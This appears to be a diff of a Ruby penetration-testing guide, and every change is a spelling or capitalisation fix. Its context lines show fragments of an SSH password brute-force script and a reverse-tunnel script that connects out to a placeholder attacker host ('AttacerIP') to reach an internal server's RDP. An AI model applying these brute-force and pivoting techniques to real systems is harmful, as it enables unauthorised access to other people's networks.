@@ -7,7 +7,7 @@ gem install net-ssh
 ```
 
 ## Simple SSH command execution 
-This is a very basic ssh client which sends and executes commands on a remote system 
+This is a very basic SSH client which sends and executes commands on a remote system 
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -29,7 +29,7 @@ end
 ```
 
 ## SSH Client with PTY shell
-Here a simple ssh client which give you an interactive PTY
+Here a simple SSH client which give you an interactive PTY
 
 ```ruby
 #!/usr/bin/env ruby
@@ -78,7 +78,7 @@ Net::SSH.start(@hostname, @username, :password => @password, :auth_methods => ["
 end
 ```
 
-## SSH Bruteforce 
+## SSH brute force 
 
 **ssh-bf.rb**
 ```ruby
@@ -104,7 +104,7 @@ def attack_ssh(host, user, password, port=22, timeout = 5)
   rescue Net::SSH::AuthenticationFailed
     puts "Wrong Password: #{host} | #{user}:#{password}" 
   rescue Net::SSH::Authentication::DisallowedMethod
-    puts "[!] The host '#{host}' dosn't accept password authentication method."
+    puts "[!] The host '#{host}' doesn't accept password authentication method."
   end
 end
 
@@ -166,7 +166,7 @@ rdesktop WebServer:3333
   |   |                       |                 |                 |
   `->-'                       |-----------------|-----------------|
 ```
-Run ssh-rtnnel.rb on the **SSH Server** 
+Run ssh-rtunnel.rb on the **SSH Server** 
 
 **ssh-rtunnel.rb**
 ```ruby
@@ -183,7 +183,7 @@ Net::SSH.start("AttacerIP", 'attacker', :password => '123123') do |ssh|
 end
 ```
 
-Now SSH from the **SSH Server** to **localhost** on the localhost's ssh port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
+Now SSH from the **SSH Server** to **localhost** on the localhost's SSH port then  connect from your localhost to your localhost on port 3333 via your RDP client, you'll be prompt for the **WebServer**'s RDP log-in screen
 
 ```
 rdesktop localhost:3333
